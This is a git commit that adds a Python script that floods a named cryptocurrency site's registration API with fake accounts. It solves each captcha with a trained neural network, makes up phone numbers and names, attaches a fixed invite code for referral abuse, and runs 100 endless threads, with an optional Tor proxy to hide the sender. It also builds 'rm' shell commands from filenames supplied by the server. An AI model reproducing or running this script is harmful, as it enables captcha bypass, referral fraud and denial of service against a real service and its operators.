58545c8d465fc4c9b9f7bd46efb7a4fe189a7b11
quabongbay <quabongbay2@gmail.com>
2022-10-13 20:07:22 +0700

    set up

---
+++ request.py
@@ -0,0 +1,186 @@
+import requests
+from requests_tor import RequestsTor
+import base64
+
+import random
+import time
+import string
+import threading
+
+import os
+import tensorflow as tf
+import numpy as np
+from tensorflow import keras
+from tensorflow.keras import layers
+
+captcha_dir = "./captcha_tmp"
+loaded_model = tf.keras.models.load_model('./vnbitcoin_captcha')
+batch_size = 16
+
+# Desired image dimensions
+img_width = 64
+img_height = 20
+all_chars =  ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
+
+base_url = 'https://api.vnbitcoin.cc'
+reg_url = base_url + "/v1/User/reg"
+cap_url = base_url + "/v1/User/cap"
+
+
+# If you use the Tor
+rt = RequestsTor(tor_ports=(9050,), tor_cport=9051)
+
+
+def register(data):
+	# resp = rt.post(reg_url, data=data).text
+	resp = requests.post(reg_url, data=data).text
+	print(resp)
+
+def get_captcha():
+	# resp = rt.get(cap_url).json()
+	resp = requests.get(cap_url).json()
+	data = resp["data"]
+
+	cap_id = data["id"]
+	base64_img = data['base_64_blob'].split(',')[1]
+
+	filename = captcha_dir + "/" + cap_id + ".png"
+
+	imgdata = base64.b64decode(base64_img)
+	with open(filename, 'wb') as f:
+		f.write(imgdata)
+
+	return (cap_id, filename)
+
+
+# Mapping characters to integers
+char_to_num = layers.StringLookup(
+    vocabulary=list(all_chars), mask_token=None
+)
+
+# Mapping integers back to original characters
+num_to_char = layers.StringLookup(
+    vocabulary=char_to_num.get_vocabulary(include_special_tokens=False), 
+    mask_token=None, 
+    invert=True
+)
+
+def encode_single_sample(img_path, label):
+    # 1. Read image
+    img = tf.io.read_file(img_path)
+    # 2. Decode and convert to grayscale
+    img = tf.io.decode_jpeg(img, channels=1)
+    # 3. Convert to float32 in [0, 1] range
+    img = tf.image.convert_image_dtype(img, tf.float32)
+    # 4. Resize to the desired size
+    img = tf.image.resize(img, [img_height, img_width])
+    # 5. Transpose the image because we want the time
+    # dimension to correspond to the width of the image.
+    img = tf.transpose(img, perm=[1, 0, 2])
+    # 6. Map the characters in label to numbers
+    label = char_to_num(tf.strings.unicode_split(label, input_encoding="UTF-8"))
+    # 7. Return a dict as our model is expecting two inputs
+    return {"image": img, "label": label}
+
+
+# A utility function to decode the output of the network
+def decode_batch_predictions(pred):
+    input_len = np.ones(pred.shape[0]) * pred.shape[1]
+    # Use greedy search. For complex tasks, you can use beam search
+    results = keras.backend.ctc_decode(pred, input_length=input_len, greedy=True)[0][0][
+        :, :4
+    ]
+    # Iterate over the results and get back the text
+    output_text = []
+    for res in results:
+        res = tf.strings.reduce_join(num_to_char(res)).numpy().decode("utf-8")
+        output_text.append(res)
+    return output_text
+
+
+
+
+def solve_captcha(cap_id, filename):
+	real_data = tf.data.Dataset.from_tensor_slices(([filename], ['1111']))
+	real_data = (
+	    real_data.map(
+	        encode_single_sample, num_parallel_calls=tf.data.AUTOTUNE
+	    )
+	    .batch(batch_size)
+	    .prefetch(buffer_size=tf.data.AUTOTUNE)
+	)
+
+	for batch in real_data.take(1):
+	    batch_images = batch["image"]
+	    batch_labels = batch["label"]
+
+	    preds = loaded_model.predict(batch_images)
+	    pred_texts = decode_batch_predictions(preds)
+
+	    orig_texts = ["test"]
+	    for label in batch_labels:
+	        label = tf.strings.reduce_join(num_to_char(label)).numpy().decode("utf-8")
+	        orig_texts.append(label)
+    
+	return pred_texts[0]
+
+
+def random_phone():
+	ran = str(random.randrange(1, 1000000000))
+	return '84' + ran.rjust(10, '0')
+
+
+def random_name():
+	return ''.join(random.choice(string.ascii_uppercase) for _ in range(20))
+
+
+def clean_up(filename):
+	clean_png_cmd = "rm " + filename
+	os.system(clean_png_cmd)
+
+#name = random_name()
+#phone =random_phone()
+
+def flood():
+	while True:
+		cap_id, filename = get_captcha()
+		cap_sol = solve_captcha(cap_id, filename)
+		
+		reg_data = {
+			'vid': cap_id,
+			'phone': random_phone(),
+			'name': random_name(),
+			'wpassword': '12345678',
+			'password': '12345678',
+			'invitecode': 'VmrPlg',
+			'vercode': cap_sol
+		}
+
+		register(reg_data)
+		clean_up(filename)
+
+
+# clean start
+clean_all_png_cmd = "rm " + captcha_dir + "/*.png"
+os.system(clean_all_png_cmd)
+
+# flood()
+
+threads = []
+
+for i in range(100):
+	t = threading.Thread(target=flood)
+	t.daemon = True
+	threads.append(t)
+
+
+for i in range(100):
+	threads[i].start()
+
+for i in range(100):
+	threads[i].join()
+
+
+
+
+
